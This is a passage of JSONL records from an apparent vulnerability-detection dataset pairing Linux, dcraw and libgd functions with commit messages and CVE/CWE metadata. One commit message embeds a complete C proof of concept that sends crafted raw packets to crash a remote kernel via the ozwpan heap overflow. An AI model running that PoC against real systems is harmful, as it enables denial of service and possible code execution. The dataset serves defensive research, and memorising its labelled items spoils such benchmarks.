le32_to_cpu(fe->lengthExtendedAttr);\n\t\tiinfo->i_lenAlloc = le32_to_cpu(fe->lengthAllocDescs);\n\t\tiinfo->i_checkpoint = le32_to_cpu(fe->checkpoint);\n\t} else {\n\t\tinode->i_blocks = le64_to_cpu(efe->logicalBlocksRecorded) <<\n\t\t    (inode->i_sb->s_blocksize_bits - 9);\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_atime, efe->accessTime))\n\t\t\tinode->i_atime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_mtime,\n\t\t\t\t\t    efe->modificationTime))\n\t\t\tinode->i_mtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&iinfo->i_crtime, efe->createTime))\n\t\t\tiinfo->i_crtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_ctime, efe->attrTime))\n\t\t\tinode->i_ctime = sbi->s_record_time;\n\n\t\tiinfo->i_unique = le64_to_cpu(efe->uniqueID);\n\t\tiinfo->i_lenEAttr = le32_to_cpu(efe->lengthExtendedAttr);\n\t\tiinfo->i_lenAlloc = le32_to_cpu(efe->lengthAllocDescs);\n\t\tiinfo->i_checkpoint = le32_to_cpu(efe->checkpoint);\n \t}\n \tinode->i_generation = iinfo->i_unique;\n \n\t/*\n\t * Sanity check length of allocation descriptors and extended attrs to\n\t * avoid integer overflows\n\t */\n\tif (iinfo->i_lenEAttr > bs || iinfo->i_lenAlloc > bs)\n\t\tgoto out;\n\t/* Now do exact checks */\n\tif (udf_file_entry_alloc_offset(inode) + iinfo->i_lenAlloc > bs)\n\t\tgoto out;\n \t/* Sanity checks for files in ICB so that we don't get confused later */\n \tif (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB) {\n \t\t/*\n\t\t * For file in ICB data is stored in allocation descriptor\n\t\t * so sizes should match\n\t\t */\n\t\tif (iinfo->i_lenAlloc != inode->i_size)\n\t\t\tgoto out;\n\t\t/* File in ICB has to fit in there... */\n\t\tif (inode->i_size > bs - udf_file_entry_alloc_offset(inode))\n\t\t\tgoto out;\n\t}\n\n\tswitch (fe->icbTag.fileType) {\n\tcase ICBTAG_FILE_TYPE_DIRECTORY:\n\t\tinode->i_op = &udf_dir_inode_operations;\n\t\tinode->i_fop = &udf_dir_operations;\n\t\tinode->i_mode |= S_IFDIR;\n\t\tinc_nlink(inode);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_REALTIME:\n\tcase ICBTAG_FILE_TYPE_REGULAR:\n\tcase ICBTAG_FILE_TYPE_UNDEF:\n\tcase ICBTAG_FILE_TYPE_VAT20:\n\t\tif (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB)\n\t\t\tinode->i_data.a_ops = &udf_adinicb_aops;\n\t\telse\n\t\t\tinode->i_data.a_ops = &udf_aops;\n\t\tinode->i_op = &udf_file_inode_operations;\n\t\tinode->i_fop = &udf_file_operations;\n\t\tinode->i_mode |= S_IFREG;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_BLOCK:\n\t\tinode->i_mode |= S_IFBLK;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_CHAR:\n\t\tinode->i_mode |= S_IFCHR;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_FIFO:\n\t\tinit_special_inode(inode, inode->i_mode | S_IFIFO, 0);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_SOCKET:\n\t\tinit_special_inode(inode, inode->i_mode | S_IFSOCK, 0);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_SYMLINK:\n\t\tinode->i_data.a_ops = &udf_symlink_aops;\n\t\tinode->i_op = &udf_symlink_inode_operations;\n\t\tinode->i_mode = S_IFLNK | S_IRWXUGO;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_MAIN:\n\t\tudf_debug(\"METADATA FILE-----\\n\");\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_MIRROR:\n\t\tudf_debug(\"METADATA MIRROR FILE-----\\n\");\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_BITMAP:\n\t\tudf_debug(\"METADATA BITMAP FILE-----\\n\");\n\t\tbreak;\n\tdefault:\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed unknown file type=%d\\n\",\n\t\t\tinode->i_ino, fe->icbTag.fileType);\n\t\tgoto out;\n\t}\n\tif (S_ISCHR(inode->i_mode) || S_ISBLK(inode->i_mode)) {\n\t\tstruct deviceSpec *dsea =\n\t\t\t(struct deviceSpec *)udf_get_extendedattr(inode, 12, 1);\n\t\tif (dsea) {\n\t\t\tinit_special_inode(inode, inode->i_mode,\n\t\t\t\tMKDEV(le32_to_cpu(dsea->majorDeviceIdent),\n\t\t\t\t      le32_to_cpu(dsea->minorDeviceIdent)));\n\t\t\t/* Developer ID ??? */\n\t\t} else\n\t\t\tgoto out;\n\t}\n\tret = 0;\nout:\n\tbrelse(bh);\n\treturn ret;\n}\n", "func_hash": 268421128721178182080104238233138561370, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-4167", "cve_desc": "The udf_read_inode function in fs/udf/inode.c in the Linux kernel before 3.19.1 does not validate certain length values, which allows local users to cause a denial of service (incorrect data representation or integer overflow, and OOPS) via a crafted UDF filesystem.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-4167"}
{"idx": 159182, "project": "linux", "commit_id": "b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c", "commit_message": "ozwpan: Use unsigned ints to prevent heap overflow\n\nUsing signed integers, the subtraction between required_size and offset\ncould wind up being negative, resulting in a memcpy into a heap buffer\nwith a negative length, resulting in huge amounts of network-supplied\ndata being copied into the heap, which could potentially lead to remote\ncode execution.. This is remotely triggerable with a magic packet.\nA PoC which obtains DoS follows below. It requires the ozprotocol.h file\nfrom this module.\n\n=-=-=-=-=-=\n\n #include <arpa/inet.h>\n #include <linux/if_packet.h>\n #include <net/if.h>\n #include <netinet/ether.h>\n #include <stdio.h>\n #include <string.h>\n #include <stdlib.h>\n #include <endian.h>\n #include <sys/ioctl.h>\n #include <sys/socket.h>\n\n #define u8 uint8_t\n #define u16 uint16_t\n #define u32 uint32_t\n #define __packed __attribute__((__packed__))\n #include \"ozprotocol.h\"\n\nstatic int hex2num(char c)\n{\n\tif (c >= '0' && c <= '9')\n\t\treturn c - '0';\n\tif (c >= 'a' && c <= 'f')\n\t\treturn c - 'a' + 10;\n\tif (c >= 'A' && c <= 'F')\n\t\treturn c - 'A' + 10;\n\treturn -1;\n}\nstatic int hwaddr_aton(const char *txt, uint8_t *addr)\n{\n\tint i;\n\tfor (i = 0; i < 6; i++) {\n\t\tint a, b;\n\t\ta = hex2num(*txt++);\n\t\tif (a < 0)\n\t\t\treturn -1;\n\t\tb = hex2num(*txt++);\n\t\tif (b < 0)\n\t\t\treturn -1;\n\t\t*addr++ = (a << 4) | b;\n\t\tif (i < 5 && *txt++ != ':')\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n\nint main(int argc, char *argv[])\n{\n\tif (argc < 3) {\n\t\tfprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);\n\t\treturn 1;\n\t}\n\n\tuint8_t dest_mac[6];\n\tif (hwaddr_aton(argv[2], dest_mac)) {\n\t\tfprintf(stderr, \"Invalid mac address.\\n\");\n\t\treturn 1;\n\t}\n\n\tint sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);\n\tif (sockfd < 0) {\n\t\tperror(\"socket\");\n\t\treturn 1;\n\t}\n\n\tstruct ifreq if_idx;\n\tint interface_index;\n\tstrncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);\n\tif (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFINDEX\");\n\t\treturn 1;\n\t}\n\tinterface_index = if_idx.ifr_ifindex;\n\tif (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFHWADDR\");\n\t\treturn 1;\n\t}\n\tuint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_elt_connect_req oz_elt_connect_req;\n\t} __packed connect_packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(0)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_CONNECT_REQ,\n\t\t\t.length = sizeof(struct oz_elt_connect_req)\n\t\t},\n\t\t.oz_elt_connect_req = {\n\t\t\t.mode = 0,\n\t\t\t.resv1 = {0},\n\t\t\t.pd_info = 0,\n\t\t\t.session_id = 0,\n\t\t\t.presleep = 35,\n\t\t\t.ms_isoc_latency = 0,\n\t\t\t.host_vendor = 0,\n\t\t\t.keep_alive = 0,\n\t\t\t.apps = htole16((1 << OZ_APPID_USB) | 0x1),\n\t\t\t.max_len_div16 = 0,\n\t\t\t.ms_per_isoc = 0,\n\t\t\t.up_audio_buf = 0,\n\t\t\t.ms_per_elt = 0\n\t\t}\n\t};\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_get_desc_rsp oz_get_desc_rsp;\n\t} __packed pwn_packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(1)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_APP_DATA,\n\t\t\t.length = sizeof(struct oz_get_desc_rsp)\n\t\t},\n\t\t.oz_get_desc_rsp = {\n\t\t\t.app_id = OZ_APPID_USB,\n\t\t\t.elt_seq_num = 0,\n\t\t\t.type = OZ_GET_DESC_RSP,\n\t\t\t.req_id = 0,\n\t\t\t.offset = htole16(2),\n\t\t\t.total_size = htole16(1),\n\t\t\t.rcode = 0,\n\t\t\t.data = {0}\n\t\t}\n\t};\n\n\tstruct sockaddr_ll socket_address = {\n\t\t.sll_ifindex = interface_index,\n\t\t.sll_halen = ETH_ALEN,\n\t\t.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t};\n\n\tif (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\tusleep(300000);\n\tif (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\treturn 0;\n}\n\nSigned-off-by: Jason A. Donenfeld <Jason@zx2c4.com>\nAcked-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>", "target": 0, "func": "void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,\nvoid oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,\n\t\t\tu8 length, u16 offset, u16 total_size)\n {\n \tstruct oz_port *port = hport;\n \tstruct urb *urb;\n\tint err = 0;\n\n\toz_dbg(ON, \"oz_hcd_get_desc_cnf length = %d offs = %d tot_size = %d\\n\",\n\t       length, offset, total_size);\n\turb = oz_find_urb_by_id(port, 0, req_id);\n \tif (!urb)\n \t\treturn;\n \tif (status == 0) {\n\t\tunsigned int copy_len;\n\t\tunsigned int required_size = urb->transfer_buffer_length;\n \n \t\tif (required_size > total_size)\n \t\t\trequired_size = total_size;\n\t\tcopy_len = required_size-offset;\n\t\tif (length <= copy_len)\n\t\t\tcopy_len = length;\n\t\tmemcpy(urb->transfer_buffer+offset, desc, copy_len);\n\t\toffset += copy_len;\n\t\tif (offset < required_size) {\n\t\t\tstruct usb_ctrlrequest *setup =\n\t\t\t\t(struct usb_ctrlrequest *)urb->setup_packet;\n\t\t\tunsigned wvalue = le16_to_cpu(setup->wValue);\n\n\t\t\tif (oz_enqueue_ep_urb(port, 0, 0, urb, req_id))\n\t\t\t\terr = -ENOMEM;\n\t\t\telse if (oz_usb_get_desc_req(port->hpd, req_id,\n\t\t\t\t\tsetup->bRequestType, (u8)(wvalue>>8),\n\t\t\t\t\t(u8)wvalue, setup->wIndex, offset,\n\t\t\t\t\trequired_size-offset)) {\n\t\t\t\toz_dequeue_ep_urb(port, 0, 0, urb);\n\t\t\t\terr = -ENOMEM;\n\t\t\t}\n\t\t\tif (err == 0)\n\t\t\t\treturn;\n\t\t}\n\t}\n\turb->actual_length = total_size;\n\toz_complete_urb(port->ozhcd->hcd, urb, 0);\n}\n", "func_hash": 338033345113830542985584316307589461928, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-4001", "cve_desc": "Integer signedness error in the oz_hcd_get_desc_cnf function in drivers/staging/ozwpan/ozhcd.c in the OZWPAN driver in the Linux kernel through 4.0.5 allows remote attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted packet.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-4001"}
{"idx": 159185, "project": "rawstudio", "commit_id": "983bda1f0fa5fa86884381208274198a620f006e", "project_url": "https://github.com/rawstudio/rawstudio", "commit_url": "https://github.com/rawstudio/rawstudio/commit/983bda1f0fa5fa86884381208274198a620f006e", "commit_message": "Avoid overflow in ljpeg_start().", "target": 0, "func": " int CLASS ljpeg_start (struct jhead *jh, int info_only)\n {\n  int c, tag;\n  ushort len;\n   uchar data[0x10000];\n   const uchar *dp;\n \n  memset (jh, 0, sizeof *jh);\n  jh->restart = INT_MAX;\n  fread (data, 2, 1, ifp);\n  if (data[1] != 0xd8) return 0;\n  do {\n    fread (data, 2, 2, ifp);\n    tag =  data[0] << 8 | data[1];\n    len = (data[2] << 8 | data[3]) - 2;\n    if (tag <= 0xff00) return 0;\n    fread (data, 1, len, ifp);\n    switch (tag) {\n      case 0xffc3:\n\tjh->sraw = ((data[7] >> 4) * (data[7] & 15) - 1) & 3;\n      case 0xffc0:\n\tjh->bits = data[0];\n\tjh->high = data[1] << 8 | data[2];\n\tjh->wide = data[3] << 8 | data[4];\n\tjh->clrs = data[5] + jh->sraw;\n\tif (len == 9 && !dng_version) getc(ifp);\n\tbreak;\n      case 0xffc4:\n\tif (info_only) break;\n\tfor (dp = data; dp < data+len && (c = *dp++) < 4; )\n\t  jh->free[c] = jh->huff[c] = make_decoder_ref (&dp);\n\tbreak;\n      case 0xffda:\n\tjh->psv = data[1+data[0]*2];\n\tjh->bits -= data[3+data[0]*2] & 15;\n\tbreak;\n      case 0xffdd:\n\tjh->restart = data[0] << 8 | data[1];\n    }\n  } while (tag != 0xffda);\n  if (info_only) return 1;\n  FORC(5) if (!jh->huff[c+1]) jh->huff[c+1] = jh->huff[c];\n  if (jh->sraw) {\n    FORC(4)        jh->huff[2+c] = jh->huff[1];\n    FORC(jh->sraw) jh->huff[1+c] = jh->huff[0];\n  }\n  jh->row = (ushort *) calloc (jh->wide*jh->clrs, 4);\n  merror (jh->row, \"ljpeg_start()\");\n  return zero_after_ff = 1;\n}\n", "func_hash": 288581977157350259504025671296085886, "file_name": "dcraw.cc", "file_hash": 257159519755338469216428419271245748021, "cwe": ["CWE-189"], "cve": "CVE-2015-3885", "cve_desc": "Integer overflow in the ljpeg_start function in dcraw 7.00 and earlier allows remote attackers to cause a denial of service (crash) via a crafted image, which triggers a buffer overflow, related to the len variable.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3885"}
{"idx": 159290, "project": "linux", "commit_id": "942080643bce061c3dd9d5718d3b745dcb39a8bc", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/942080643bce061c3dd9d5718d3b745dcb39a8bc", "commit_message": "eCryptfs: Remove buggy and unnecessary write in file name decode routine\n\nDmitry Chernenkov used KASAN to discover that eCryptfs writes past the\nend of the allocated buffer during encrypted filename decoding. This\nfix corrects the issue by getting rid of the unnecessary 0 write when\nthe current bit offset is 2.\n\nSigned-off-by: Michael Halcrow <mhalcrow@google.com>\nReported-by: Dmitry Chernenkov <dmitryc@google.com>\nSuggested-by: Kees Cook <keescook@chromium.org>\nCc: stable@vger.kernel.org # v2.6.29+: 51ca58d eCryptfs: Filename Encryption: Encoding and encryption functions\nSigned-off-by: Tyler Hicks <tyhicks@canonical.com>", "target": 0, "func": "ecryptfs_decode_from_filename(unsigned char *dst, size_t *dst_size,\n\t\t\t      const unsigned char *src, size_t src_size)\n{\n\tu8 current_bit_offset = 0;\n\tsize_t src_byte_offset = 0;\n\tsize_t dst_byte_offset = 0;\n\n\tif (dst == NULL) {\n\t\t(*dst_size) = ecryptfs_max_decoded_size(src_size);\n\t\tgoto out;\n\t}\n\twhile (src_byte_offset < src_size) {\n\t\tunsigned char src_byte =\n\t\t\t\tfilename_rev_map[(int)src[src_byte_offset]];\n\n\t\tswitch (current_bit_offset) {\n\t\tcase 0:\n\t\t\tdst[dst_byte_offset] = (src_byte << 2);\n\t\t\tcurrent_bit_offset = 6;\n\t\t\tbreak;\n\t\tcase 6:\n\t\t\tdst[dst_byte_offset++] |= (src_byte >> 4);\n\t\t\tdst[dst_byte_offset] = ((src_byte & 0xF)\n\t\t\t\t\t\t << 4);\n\t\t\tcurrent_bit_offset = 4;\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tdst[dst_byte_offset++] |= (src_byte >> 2);\n\t\t\tdst[dst_byte_offset] = (src_byte << 6);\n\t\t\tcurrent_bit_offset = 2;\n \t\t\tbreak;\n \t\tcase 2:\n \t\t\tdst[dst_byte_offset++] |= (src_byte);\n \t\t\tcurrent_bit_offset = 0;\n \t\t\tbreak;\n \t\t}\n\t\tsrc_byte_offset++;\n\t}\n\t(*dst_size) = dst_byte_offset;\nout:\n\treturn;\n}\n", "func_hash": 236694491287239416917776638297100915524, "file_name": "crypto.c", "file_hash": 84355224477241939838506752132701644381, "cwe": ["CWE-189"], "cve": "CVE-2014-9683", "cve_desc": "Off-by-one error in the ecryptfs_decode_from_filename function in fs/ecryptfs/crypto.c in the eCryptfs subsystem in the Linux kernel before 3.18.2 allows local users to cause a denial of service (buffer overflow and system crash) or possibly gain privileges via a crafted filename.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9683"}
{"idx": 159617, "project": "linux", "commit_id": "d157bd761585605b7882935ffb86286919f62ea1", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/d157bd761585605b7882935ffb86286919f62ea1", "commit_message": "netfilter: x_tables: check for size overflow\n\nBen Hawkes says:\n integer overflow in xt_alloc_table_info, which on 32-bit systems can\n lead to small structure allocation and a copy_from_user based heap\n corruption.\n\nReported-by: Ben Hawkes <hawkes@google.com>\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>", "target": 0, "func": "struct xt_table_info *xt_alloc_table_info(unsigned int size)\n{\n \tstruct xt_table_info *info = NULL;\n \tsize_t sz = sizeof(*info) + size;\n \n\tif (sz < sizeof(*info))\n\t\treturn NULL;\n\n \t/* Pedantry: prevent them from hitting BUG() in vmalloc.c --RR */\n \tif ((SMP_ALIGN(size) >> PAGE_SHIFT) + 2 > totalram_pages)\n \t\treturn NULL;\n\n\tif (sz <= (PAGE_SIZE << PAGE_ALLOC_COSTLY_ORDER))\n\t\tinfo = kmalloc(sz, GFP_KERNEL | __GFP_NOWARN | __GFP_NORETRY);\n\tif (!info) {\n\t\tinfo = vmalloc(sz);\n\t\tif (!info)\n\t\t\treturn NULL;\n\t}\n\tmemset(info, 0, sizeof(*info));\n\tinfo->size = size;\n\treturn info;\n}\n", "func_hash": 12723810103301769293584528533727605602, "file_name": "x_tables.c", "file_hash": 235525317983388942046561010619749657959, "cwe": ["CWE-189"], "cve": "CVE-2016-3135", "cve_desc": "Integer overflow in the xt_alloc_table_info function in net/netfilter/x_tables.c in the Linux kernel through 4.5.2 on 32-bit platforms allows local users to gain privileges or cause a denial of service (heap memory corruption) via an IPT_SO_SET_REPLACE setsockopt call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-3135"}
{"idx": 159631, "project": "libgd", "commit_id": "2bb97f407c1145c850416a3bfbcc8cf124e68a19", "project_url": "https://github.com/libgd/libgd", "commit_url": "https://github.com/libgd/libgd/commit/2bb97f407c1145c850416a3bfbcc8cf124e68a19", "commit_message": "gd2: handle corrupt images better (CVE-2016-3074)\n\nMake sure we do some range checking on corrupted chunks.\n\nThanks to Hans Jerry Illikainen <hji@dyntopia.com> for indepth report\nand reproducer information.  Made for easy test case writing :).", "target": 0, "func": "_gd2GetHeader (gdIOCtxPtr in, int *sx, int *sy,\n               int *cs, int *vers, int *fmt, int *ncx, int *ncy,\n               t_chunk_info ** chunkIdx)\n{\n\tint i;\n\tint ch;\n\tchar id[5];\n\tt_chunk_info *cidx;\n\tint sidx;\n\tint nc;\n\n\tGD2_DBG (printf (\"Reading gd2 header info\\n\"));\n\n\tfor (i = 0; i < 4; i++) {\n\t\tch = gdGetC (in);\n\t\tif (ch == EOF) {\n\t\t\tgoto fail1;\n\t\t};\n\t\tid[i] = ch;\n\t};\n\tid[4] = 0;\n\n\tGD2_DBG (printf (\"Got file code: %s\\n\", id));\n\n\t/* Equiv. of 'magick'.  */\n\tif (strcmp (id, GD2_ID) != 0) {\n\t\tGD2_DBG (printf (\"Not a valid gd2 file\\n\"));\n\t\tgoto fail1;\n\t};\n\n\t/* Version */\n\tif (gdGetWord (vers, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"Version: %d\\n\", *vers));\n\n\tif ((*vers != 1) && (*vers != 2)) {\n\t\tGD2_DBG (printf (\"Bad version: %d\\n\", *vers));\n\t\tgoto fail1;\n\t};\n\n\t/* Image Size */\n\tif (!gdGetWord (sx, in)) {\n\t\tGD2_DBG (printf (\"Could not get x-size\\n\"));\n\t\tgoto fail1;\n\t}\n\tif (!gdGetWord (sy, in)) {\n\t\tGD2_DBG (printf (\"Could not get y-size\\n\"));\n\t\tgoto fail1;\n\t}\n\tGD2_DBG (printf (\"Image is %dx%d\\n\", *sx, *sy));\n\n\t/* Chunk Size (pixels, not bytes!) */\n\tif (gdGetWord (cs, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"ChunkSize: %d\\n\", *cs));\n\n\tif ((*cs < GD2_CHUNKSIZE_MIN) || (*cs > GD2_CHUNKSIZE_MAX)) {\n\t\tGD2_DBG (printf (\"Bad chunk size: %d\\n\", *cs));\n\t\tgoto fail1;\n\t};\n\n\t/* Data Format */\n\tif (gdGetWord (fmt, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"Format: %d\\n\", *fmt));\n\n\tif ((*fmt != GD2_FMT_RAW) && (*fmt != GD2_FMT_COMPRESSED) &&\n\t        (*fmt != GD2_FMT_TRUECOLOR_RAW) &&\n\t        (*fmt != GD2_FMT_TRUECOLOR_COMPRESSED)) {\n\t\tGD2_DBG (printf (\"Bad data format: %d\\n\", *fmt));\n\t\tgoto fail1;\n\t};\n\n\n\t/* # of chunks wide */\n\tif (gdGetWord (ncx, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"%d Chunks Wide\\n\", *ncx));\n\n\t/* # of chunks high */\n\tif (gdGetWord (ncy, in) != 1) {\n\t\tgoto fail1;\n\t};\n\tGD2_DBG (printf (\"%d Chunks vertically\\n\", *ncy));\n\n\tif (gd2_compressed (*fmt)) {\n\t\tnc = (*ncx) * (*ncy);\n\t\tGD2_DBG (printf (\"Reading %d chunk index entries\\n\", nc));\n\t\tsidx = sizeof (t_chunk_info) * nc;\n\t\tcidx = gdCalloc (sidx, 1);\n\t\tif (!cidx) {\n\t\t\tgoto fail1;\n\t\t}\n\t\tfor (i = 0; i < nc; i++) {\n\t\t\tif (gdGetInt (&cidx[i].offset, in) != 1) {\n\t\t\t\tgoto fail2;\n\t\t\t};\n \t\t\tif (gdGetInt (&cidx[i].size, in) != 1) {\n \t\t\t\tgoto fail2;\n \t\t\t};\n\t\t\tif (cidx[i].offset < 0 || cidx[i].size < 0)\n\t\t\t\tgoto fail2;\n \t\t};\n \t\t*chunkIdx = cidx;\n \t};\n\n\tGD2_DBG (printf (\"gd2 header complete\\n\"));\n\n\treturn 1;\nfail2:\n\tgdFree(cidx);\nfail1:\n\treturn 0;\n}\n", "func_hash": 63300892053731816545461412987339678521, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-3074", "cve_desc": "Integer signedness error in GD Graphics Library 2.1.1 (aka libgd or libgd2) allows remote attackers to cause a denial of service (crash) or potentially execute arbitrary code via crafted compressed gd2 data, which triggers a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-3074"}
{"idx": 159678, "project": "linux", "commit_id": "8b8a321ff72c785ed5e8b4cf6eda20b35d427390", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/8b8a321ff72c785ed5e8b4cf6eda20b35d427390", "commit_message": "tcp: fix zero cwnd in tcp_cwnd_reduction\n\nPatch 3759824da87b (\"tcp: PRR uses CRB mode by default and SS mode\nconditionally\") introduced a bug that cwnd may become 0 when both\ninflight and sndcnt are 0 (cwnd = inflight + sndcnt). This may lead\nto a div-by-zero if the connection starts another cwnd reduction\nphase by setting tp->prior_cwnd to the current cwnd (0) in\ntcp_init_cwnd_reduction().\n\nTo prevent this we skip PRR operation when nothing is acked or\nsacked. Then cwnd must be positive in all cases as long as ssthresh\nis positive:\n\n1) The proportional reduction mode\n   inflight > ssthresh > 0\n\n2) The reduction bound mode\n  a) inflight == ssthresh > 0\n\n  b) inflight < ssthresh\n     sndcnt > 0 since newly_acked_sacked > 0 and inflight < ssthresh\n\nTherefore in all cases inflight and sndcnt can not both be 0.\nWe check invalid tp->prior_cwnd to avoid potential div0 bugs.\n\nIn reality this bug is triggered only with a sequence of less common\nevents.  For example, the connection is terminating an ECN-triggered\ncwnd reduction with an inflight 0, then it receives reordered/old\nACKs or DSACKs from prior transmission (which acks nothing). Or the\nconnection is in fast recovery stage that marks everything lost,\nbut fails to retransmit due to local issues, then receives data\npackets from other end which acks nothing.\n\nFixes: 3759824da87b (\"tcp: PRR uses CRB mode by default and SS mode conditionally\")\nReported-by: Oleksandr Natalenko <oleksandr@natalenko.name>\nSigned-off-by: Yuchung Cheng <ycheng@google.com>\nSigned-off-by: Neal Cardwell <ncardwell@google.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "static void tcp_cwnd_reduction(struct sock *sk, const int prior_unsacked,\n\t\t\t       int fast_rexmit, int flag)\n{\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tint sndcnt = 0;\n\tint delta = tp->snd_ssthresh - tcp_packets_in_flight(tp);\n \tint newly_acked_sacked = prior_unsacked -\n \t\t\t\t (tp->packets_out - tp->sacked_out);\n \n\tif (newly_acked_sacked <= 0 || WARN_ON_ONCE(!tp->prior_cwnd))\n\t\treturn;\n\n \ttp->prr_delivered += newly_acked_sacked;\n \tif (delta < 0) {\n \t\tu64 dividend = (u64)tp->snd_ssthresh * tp->prr_delivered +\n\t\t\t       tp->prior_cwnd - 1;\n\t\tsndcnt = div_u64(dividend, tp->prior_cwnd) - tp->prr_out;\n\t} else if ((flag & FLAG_RETRANS_DATA_ACKED) &&\n\t\t   !(flag & FLAG_LOST_RETRANS)) {\n\t\tsndcnt = min_t(int, delta,\n\t\t\t       max_t(int, tp->prr_delivered - tp->prr_out,\n\t\t\t\t     newly_acked_sacked) + 1);\n\t} else {\n\t\tsndcnt = min(delta, newly_acked_sacked);\n\t}\n\tsndcnt = max(sndcnt, (fast_rexmit ? 1 : 0));\n\ttp->snd_cwnd = tcp_packets_in_flight(tp) + sndcnt;\n}\n", "func_hash": 312634999703865654917027214382175772780, "file_name": "tcp_input.c", "file_hash": 217590060409483657677766778384038241976, "cwe": ["CWE-189"], "cve": "CVE-2016-2070", "cve_desc": "The tcp_cwnd_reduction function in net/ipv4/tcp_input.c in the Linux kernel before 4.3.5 allows remote attackers to cause a denial of service (divide-by-zero error and system crash) via crafted TCP traffic.", "nvd_url": 